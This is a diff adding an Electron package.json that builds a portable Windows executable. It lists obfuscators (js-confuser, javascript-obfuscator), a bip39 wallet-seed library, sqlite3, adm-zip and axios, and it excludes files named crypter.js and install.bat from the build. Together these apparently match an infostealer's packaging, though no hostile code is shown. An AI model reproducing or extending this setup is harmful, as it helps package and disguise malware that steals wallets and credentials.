@@ -1,0 +1,48 @@
+{
+  "name": "build",
+  "version": "1.0.0",
+  "description": "Fewer",
+  "main": "main.js",
+  "author": "Fewer",
+  "license": "MIT",
+  "scripts": {
+    "start": "electron .",
+    "electron-builder": "electron-builder --win"
+  },
+  "build": {
+    "win": {
+      "icon": "icon.ico",
+      "files": [
+        "!source/",
+        "!build/",
+        "!32392.js",
+        "!crypter.js",
+        "!install.bat"
+      ],
+      "target": [
+        {
+          "target": "portable",
+          "arch": [
+            "x64"
+          ]
+        }
+      ]
+    },
+    "directories": {
+      "output": "build"
+    }
+  },
+  "dependencies": {
+    "adm-zip": "^0.5.10",
+    "axios": "^1.3.2",
+    "bip39": "^3.0.4",
+    "sqlite3": "^5.1.4",
+    "crypto": "^1.0.1",
+    "js-confuser": "^1.7.0"
+  },
+  "devDependencies": {
+    "electron": "^23.0.0",
+    "electron-builder": "^23.6.0",
+    "javascript-obfuscator": "^4.0.2"
+  }
+}
